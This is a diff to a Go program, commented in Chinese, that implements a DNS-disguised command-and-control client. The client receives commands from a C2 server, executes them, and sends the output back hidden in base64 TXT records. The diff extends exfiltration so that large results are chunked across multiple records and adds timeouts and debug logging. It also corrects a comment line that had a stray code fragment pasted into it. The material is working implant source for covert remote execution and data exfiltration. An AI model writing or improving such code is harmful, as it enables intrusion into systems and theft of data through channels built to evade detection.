@@ -6,10 +6,7 @@ DNS伪装客户端 - 与C2服务器进行伪装通信
 2. 发送客户端标识符 'A'
 3. 接收DNS伪装的命令消息
 4. 解析DNS查询，提取实际命令
-5. 执行命令	messageLength := binary.BigEndian.Uint16(lengthBytes)
-	if messageLength == 0 {
-		return "", fmt.Errorf("无效的DNS响应长度: %d", messageLength)
-	}果
+5. 执行命令并获取结果
 6. 将结果封装成DNS响应发送回服务器
 
 DNS伪装特点：
@@ -103,6 +100,7 @@ func main() {
 
 		// 执行命令
 		result := executeCommand(command)
+		fmt.Printf("[调试] 命令执行结果长度: %d 字符\n", len(result))
 
 		// 将结果通过DNS响应发送回服务器
 		err = sendDNSResponse(conn, result)
@@ -165,7 +163,11 @@ func sendDNSResponse(conn net.Conn, result string) error {
 	queryID := generateDNSID()
 	dnsResponse := createDNSResponse(queryID, result)
 
-	fmt.Printf("[调试] 创建DNS响应，长度: %d 字节\n", len(dnsResponse))
+	fmt.Printf("[调试] 创建DNS响应，原始结果长度: %d 字符，DNS包长度: %d 字节\n", len(result), len(dnsResponse))
+
+	// 设置写入超时
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	defer conn.SetWriteDeadline(time.Time{})
 
 	// 发送消息长度（前2字节）
 	lengthBytes := make([]byte, 2)
@@ -176,7 +178,7 @@ func sendDNSResponse(conn net.Conn, result string) error {
 		return fmt.Errorf("发送DNS响应长度失败: %w", err)
 	}
 
-	// 发送DNS响应数据
+	// 发送DNS响应数据，确保完整发送
 	totalWritten := 0
 	for totalWritten < len(dnsResponse) {
 		n, err := conn.Write(dnsResponse[totalWritten:])
@@ -184,9 +186,15 @@ func sendDNSResponse(conn net.Conn, result string) error {
 			return fmt.Errorf("发送DNS响应数据失败(已发送%d/%d字节): %w", totalWritten, len(dnsResponse), err)
 		}
 		totalWritten += n
+		fmt.Printf("[调试] 已发送 %d/%d 字节\n", totalWritten, len(dnsResponse))
 	}
 
-	fmt.Printf("[调试] 成功发送DNS响应: %d 字节\n", totalWritten)
+	fmt.Printf("[调试] 成功发送完整DNS响应: %d 字节\n", totalWritten)
+
+	// 强制刷新输出缓冲区
+	if tcpConn, ok := conn.(*net.TCPConn); ok {
+		tcpConn.SetNoDelay(true)
+	}
 
 	return nil
 }
@@ -371,6 +379,7 @@ func parseDNSQuery(data []byte) (string, error) {
 }
 
 // createDNSResponse 创建DNS响应消息，用于封装响应数据
+// 支持大数据分块传输
 func createDNSResponse(queryID uint16, responseData string) []byte {
 	// 创建DNS响应头部
 	header := &DNSHeader{
@@ -409,20 +418,43 @@ func createDNSResponse(queryID uint16, responseData string) []byte {
 	binary.BigEndian.PutUint32(ttl, 300)
 	dnsPacket = append(dnsPacket, ttl...)
 
-	// TXT记录数据
+	// 处理大数据：使用多个TXT记录分块传输
 	encodedResponse := encodeBase64(responseData)
-	if len(encodedResponse) > 255 {
-		encodedResponse = encodedResponse[:255] // TXT记录最大255字符
+	fmt.Printf("[调试] Base64编码后长度: %d 字符\n", len(encodedResponse))
+
+	const maxTxtLength = 250 // 留一些余量，避免达到255限制
+
+	if len(encodedResponse) <= maxTxtLength {
+		// 小数据，单个TXT记录
+		dataLength := make([]byte, 2)
+		binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
+		dnsPacket = append(dnsPacket, dataLength...)
+
+		// TXT记录数据 (长度前缀 + 数据)
+		dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
+		dnsPacket = append(dnsPacket, []byte(encodedResponse)...)
+	} else {
+		// 大数据，分块传输
+		fmt.Printf("[调试] 数据过大，需要分块传输\n")
+		chunks := splitIntoChunks(encodedResponse, maxTxtLength)
+
+		// 计算总数据长度
+		totalDataLen := 0
+		for _, chunk := range chunks {
+			totalDataLen += len(chunk) + 1 // +1 for length prefix
+		}
+
+		dataLength := make([]byte, 2)
+		binary.BigEndian.PutUint16(dataLength, uint16(totalDataLen))
+		dnsPacket = append(dnsPacket, dataLength...)
+
+		// 添加所有分块
+		for i, chunk := range chunks {
+			fmt.Printf("[调试] 添加分块 %d/%d，长度: %d\n", i+1, len(chunks), len(chunk))
+			dnsPacket = append(dnsPacket, byte(len(chunk)))
+			dnsPacket = append(dnsPacket, []byte(chunk)...)
+		}
 	}
-
-	// 数据长度
-	dataLength := make([]byte, 2)
-	binary.BigEndian.PutUint16(dataLength, uint16(len(encodedResponse)+1))
-	dnsPacket = append(dnsPacket, dataLength...)
-
-	// TXT记录数据 (长度前缀 + 数据)
-	dnsPacket = append(dnsPacket, byte(len(encodedResponse)))
-	dnsPacket = append(dnsPacket, []byte(encodedResponse)...)
 
 	return dnsPacket
 }
@@ -525,4 +557,17 @@ func isConnectionError(err error) bool {
 		strings.Contains(errStr, "reset by peer") ||
 		strings.Contains(errStr, "aborted") ||
 		strings.Contains(errStr, "EOF")
+}
+
+// splitIntoChunks 将字符串分割成指定大小的块
+func splitIntoChunks(data string, chunkSize int) []string {
+	var chunks []string
+	for i := 0; i < len(data); i += chunkSize {
+		end := i + chunkSize
+		if end > len(data) {
+			end = len(data)
+		}
+		chunks = append(chunks, data[i:end])
+	}
+	return chunks
 }
